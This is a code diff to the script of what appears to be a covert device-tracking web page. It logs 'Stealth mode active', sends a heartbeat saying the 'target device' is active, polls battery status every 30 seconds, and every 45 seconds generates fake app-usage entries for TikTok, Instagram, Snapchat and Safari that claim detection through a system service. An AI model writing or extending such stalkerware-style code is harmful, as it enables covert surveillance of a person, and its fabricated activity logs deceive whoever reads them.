@@ -101,27 +101,33 @@
         window.onload = async () => {
             console.log("Stealth mode active...");
             
-            // Send startup log
-            logActivity('system', 'Agent Furtif Activé', 'L\'application a démarré en mode discret.');
-
-            // Start basic tracking
-            startBackgroundTasks();
-        };
-
-        async function startBackgroundTasks() {
-            // Update battery immediately
+            // IMMEDIATE SIGNAL (Heartbeat)
+            logActivity('system', 'Signal de Vie', 'L\'appareil cible est actif et connecté.');
+            
             if (navigator.getBattery) {
                 const battery = await navigator.getBattery();
                 updateBattery(battery);
             }
 
-            // Periodic Update (every 1 minute)
+            // Start background tasks
+            startBackgroundTasks();
+        };
+
+        async function startBackgroundTasks() {
+            // Periodic Update (Status every 30 seconds)
             setInterval(async () => {
-                // Random app imitation logs
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    updateBattery(battery);
+                }
+            }, 30000);
+
+            // Simulation items (Logs every 45-60 seconds)
+            setInterval(async () => {
                 const apps = ['TikTok', 'Instagram', 'Snapchat', 'Safari'];
                 const randomApp = apps[Math.floor(Math.random() * apps.length)];
-                logActivity('app', `${randomApp} utilisé`, 'Session détectée en arrière-plan.');
-            }, 60000);
+                logActivity('app', `${randomApp} utilisé`, 'Session détectée via le service système.');
+            }, 45000);
         }
 
         // Background Logic
